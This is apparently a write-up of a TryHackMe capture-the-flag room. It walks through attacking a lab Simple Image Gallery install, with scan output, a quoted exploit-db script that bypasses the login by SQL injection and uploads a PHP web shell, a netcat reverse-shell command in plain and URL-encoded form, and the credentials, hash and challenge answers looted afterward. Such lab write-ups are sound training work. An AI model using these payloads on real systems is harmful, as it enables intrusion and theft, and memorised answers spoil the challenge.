# Retro Walkthrough
### Link
- https://tryhackme.com/room/gallery666
---
### Recon
```
nmap -sC -sC -p- [IP]
```
**Namp scan result**
```
nmap -sC -sV 10.10.102.98
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-13 14:00 EST
Nmap scan report for 10.10.102.98
Host is up (0.11s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Simple Image Gallery System
```
**Question**
#### How many ports are open?
**Answer** 
#### 2
When you check address: http://[IP], you are on the Apache default page.

When you try the address:  http://[IP]:8080, you are redirected to http://[IP]/gallery/login.php.

You catch en important information, the name of the CMS : [Simple Image Gallery](https://www.joomlaworks.net/extensions/free/simple-image-gallery)
**Question**
#### What's the name of the CMS?
**Answer** 
#### Simple Image Gallery

Let's check [exploit-db](https://www.exploit-db.com/). We are lucky because we found few potential exploit. The first one, [RCE](https://www.exploit-db.com/exploits/50214) looks like a grweat option to bypass the authentication.
```
# Exploit Title: Simple Image Gallery 1.0 - Remote Code Execution (RCE) (Unauthenticated)
# Date: 17.08.2021
# Exploit Author: Tagoletta (Tağmaç)
# Software Link: https://www.sourcecodester.com/php/14903/simple-image-gallery-web-app-using-php-free-source-code.html
# Version: V 1.0
# Tested on: Ubuntu

import requests
import random
import string
import json
from bs4 import BeautifulSoup

url = input("TARGET = ")

if not url.startswith('http://') and not url.startswith('https://'):
    url = "http://" + url
if not url.endswith('/'):
    url = url + "/"

payload= "<?php if(isset($_GET['cmd'])){ echo '<pre>'; $cmd = ($_GET['cmd']); system($cmd); echo '</pre>'; die; } ?>"

session = requests.session()

print("Login Bypass")

request_url = url + "/classes/Login.php?f=login"
post_data = {"username": "admin' or '1'='1'#", "password": ""}
bypassUser = session.post(request_url, data=post_data)
data = json.loads(bypassUser.text)
status = data["status"]
.....
```
```
post_data = {"username": "admin' or '1'='1'#", "password": ""}
```
---
### Exploit
Initialy, I tried **admin' or '1'='1'#** but it didn't work and I remembered we can use **--** to indicate a comment in SQL. That means the rest of the query is considered as a comment. For more detail: [Link](https://blog.raw.pm/en/sql-injection-mysql-comment/)

Let's try the combination Username --> **admin' OR 1=1 -- -** and Password --> x

It works and we are connected ^^ 

Now we can try to use the RCE to gain access.
- First: Execute the [Exploit](https://www.exploit-db.com/exploits/50214)
```
python3 50214.py                                        
TARGET = http://10.10.102.98:8080
Login Bypass
shell name TagohessdmjozsxddkzLetta

protecting user

User ID : 1
Firsname : Adminstrator
Lasname : Admin
Username : admin

shell uploading
- OK -
Shell URL : http://10.10.102.98/gallery/uploads/1644781020_TagohessdmjozsxddkzLetta.php?cmd=whoami

```
- Second: Start a listener
```
nc -nlvp 4646
```
- Third: Find the appropriate Reverse Shell. For that, check this [Link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd)
```
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP] 4646 >/tmp/f
```
- Fourth: Encode the reverse shell to the appropriate format. Move to this [online tool](https://www.urlencoder.org/)
```
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.11.20.2%201234%20%3E%2Ftmp%2Ff
```
- Fifth: Based on the result of the step **First**, change the **cmd** with the encode result from step **Fourth**
```
http://10.10.102.98/gallery/uploads/1644781020_TagohessdmjozsxddkzLetta.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff|%2Fbin%2Fsh%20-i%202%3E%261|nc%2010.6.96.167%204646%20%3E%2Ftmp%2Ff
```
```
nc -nlvp 4646
Connection from 10.10.102.98:45342
/bin/sh: 0: can't access tty; job control turned off
$
```
**Question**
#### What's the hash password of the admin user?

I spent a lot of time into this machine to find something....
```
$ pwd
/var/www/html/gallery
$ ls -l
total 84
-rwxr-xr-x  1 www-data www-data  198 Mar 19  2021 404.html
drwxr-xr-x  2 www-data www-data 4096 Aug  9  2021 albums
drwxr-xr-x  2 www-data www-data 4096 Aug  9  2021 archives
drwxr-xr-x  4 www-data www-data 4096 Jun 28  2021 assets
drwxr-xr-x  6 www-data www-data 4096 Jun 28  2021 build
drwxr-xr-x  2 www-data www-data 4096 Aug 25 09:05 classes
-rwxr-xr-x  1 www-data www-data 1629 Aug  9  2021 config.php
-rwxr-xr-x  1 www-data www-data   26 Aug 25 09:24 create_account.php
drwxr-xr-x  2 www-data www-data 4096 Aug 25 08:24 database
drwxr-xr-x  4 www-data www-data 4096 Jun 28  2021 dist
-rwxr-xr-x  1 www-data www-data 1662 Aug  9  2021 home.php
drwxr-xr-x  2 www-data www-data 4096 Jun 28  2021 inc
-rwxr-xr-x  1 www-data www-data 3208 Aug  9  2021 index.php
-rwxr-xr-x  1 www-data www-data  695 Aug 25 08:42 initialize.php
-rwxr-xr-x  1 www-data www-data 3942 Aug 25 10:22 login.php
drwxr-xr-x 61 www-data www-data 4096 Jul 16  2021 plugins
drwxr-xr-x  2 www-data www-data 4096 Aug  6  2021 report
drwxr-xr-x  2 www-data www-data 4096 Aug  6  2021 schedules
drwxr-xr-x  2 www-data www-data 4096 Jun 28  2021 system_info
drwxr-xr-x  3 www-data www-data 4096 Feb 13 19:37 uploads
drwxr-xr-x  2 www-data www-data 4096 Jun 28  2021 user
```
I found this directory and too many php files. The most important file: **initialize.php**
```
$ cat initialize.php
<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');

if(!defined('base_url')) define('base_url',"http://" . $_SERVER['SERVER_ADDR'] . "/gallery/");
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"gallery_user");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"passw0rd321");
if(!defined('DB_NAME')) define('DB_NAME',"gallery_db");
?>
```
We have the **DB_USERNAME** and **DB_PASSWORD** so we can move into the DB and find the Hash

**Answer** 
#### a228b12a08b6527e7978cbe5d914531c

**Question**
#### What's the user flag?

Another task where I spent a lot of time. Maybe, I'm not efficient.......
```
$ pwd
/var
$ ls -la
total 52
drwxr-xr-x 13 root root   4096 May 20  2021 .
drwxr-xr-x 23 root root   4096 Feb 12 21:42 ..
drwxr-xr-x  3 root root   4096 Feb 13 19:00 backups
drwxr-xr-x  9 root root   4096 May 21  2021 cache
drwxrwxrwt  2 root root   4096 May 20  2021 crash
drwxr-xr-x 42 root root   4096 Feb 12 23:08 lib
drwxrwsr-x  2 root staff  4096 Apr 24  2018 local
lrwxrwxrwx  1 root root      9 Aug  6  2020 lock -> /run/lock
drwxrwxr-x 11 root syslog 4096 Feb 13 19:07 log
drwxrwsr-x  2 root mail   4096 Aug  6  2020 mail
drwxr-xr-x  2 root root   4096 Aug  6  2020 opt
lrwxrwxrwx  1 root root      4 Aug  6  2020 run -> /run
drwxr-xr-x  5 root root   4096 May 20  2021 spool
drwxrwxrwt  2 root root   4096 Feb 13 18:59 tmp
drwxr-xr-x  3 root root   4096 May 20  2021 www
```
Under **var**, I found the **backups** directory.
```
$ cd backups
$ pwd
/var/backups
$ ls -la
total 60
drwxr-xr-x  3 root root  4096 Feb 13 19:00 .
drwxr-xr-x 13 root root  4096 May 20  2021 ..
-rw-r--r--  1 root root 34789 Feb 12 21:40 apt.extended_states.0
-rw-r--r--  1 root root  3748 Aug 25 10:35 apt.extended_states.1.gz
-rw-r--r--  1 root root  3516 May 21  2021 apt.extended_states.2.gz
-rw-r--r--  1 root root  3575 May 20  2021 apt.extended_states.3.gz
drwxr-xr-x  5 root root  4096 May 24  2021 mike_home_backup
```
We have **mike_home_backup**. If we check it contents:
```
$ cd mike_home_backup
$ ls -la
total 36
drwxr-xr-x 5 root root 4096 May 24  2021 .
drwxr-xr-x 3 root root 4096 Feb 13 19:00 ..
-rwxr-xr-x 1 root root  135 May 24  2021 .bash_history
-rwxr-xr-x 1 root root  220 May 24  2021 .bash_logout
-rwxr-xr-x 1 root root 3772 May 24  2021 .bashrc
drwxr-xr-x 3 root root 4096 May 24  2021 .gnupg
-rwxr-xr-x 1 root root  807 May 24  2021 .profile
drwxr-xr-x 2 root root 4096 May 24  2021 documents
drwxr-xr-x 2 root root 4096 May 24  2021 images
```
We have the **.bash_history**. Let's explore it ^^
```
$ cat .bash_history
cd ~
ls
ping 1.1.1.1
cat /home/mike/user.txt
cd /var/www/
ls
cd html
ls -al
cat index.html
sudo -lb3stpassw0rdbr0xx
clear
sudo -l
exit
```
We have the **su password** --> **lb3stpassw0rdbr0xx**

```

```
